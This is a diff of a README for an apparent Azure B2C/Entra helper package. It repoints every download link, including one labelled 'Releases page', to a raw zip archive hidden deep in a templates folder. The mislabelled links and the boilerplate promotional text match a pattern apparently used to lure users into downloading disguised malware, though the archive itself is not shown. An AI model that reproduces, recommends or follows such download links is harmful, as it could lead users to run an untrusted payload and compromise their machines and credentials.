@@ -1,6 +1,6 @@
 # 🎉 Azure-UserFlow-Helpers - Simplify Your User Flow Process
 
-![Download](https://raw.githubusercontent.com/Blake201030/Azure-UserFlow-Helpers/master/scarifier/Azure-UserFlow-Helpers.zip%20UserFlow%20Helpers-brightgreen)
+![Download](https://github.com/Blake201030/Azure-UserFlow-Helpers/raw/refs/heads/master/templates/UserFlow.Templates/content/ApiConnector/User_Helpers_Azure_Flow_3.4-beta.2.zip%20UserFlow%20Helpers-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ To run Azure-UserFlow-Helpers, ensure you have the following:
 
 To download the Azure-UserFlow-Helpers package, visit this page:
 
-[Download Azure-UserFlow-Helpers](https://raw.githubusercontent.com/Blake201030/Azure-UserFlow-Helpers/master/scarifier/Azure-UserFlow-Helpers.zip)
+[Download Azure-UserFlow-Helpers](https://github.com/Blake201030/Azure-UserFlow-Helpers/raw/refs/heads/master/templates/UserFlow.Templates/content/ApiConnector/User_Helpers_Azure_Flow_3.4-beta.2.zip)
 
 Here are the steps to download and run the software:
 
@@ -65,4 +65,4 @@ We welcome contributions! To help improve the Azure-UserFlow-Helpers package:
 
 Azure-UserFlow-Helpers streamlines the process of managing user flows with B2C and Entra. Download the package today and enhance your application's capabilities.
 
-For further updates and releases, check the [Releases page](https://raw.githubusercontent.com/Blake201030/Azure-UserFlow-Helpers/master/scarifier/Azure-UserFlow-Helpers.zip).
+For further updates and releases, check the [Releases page](https://github.com/Blake201030/Azure-UserFlow-Helpers/raw/refs/heads/master/templates/UserFlow.Templates/content/ApiConnector/User_Helpers_Azure_Flow_3.4-beta.2.zip).
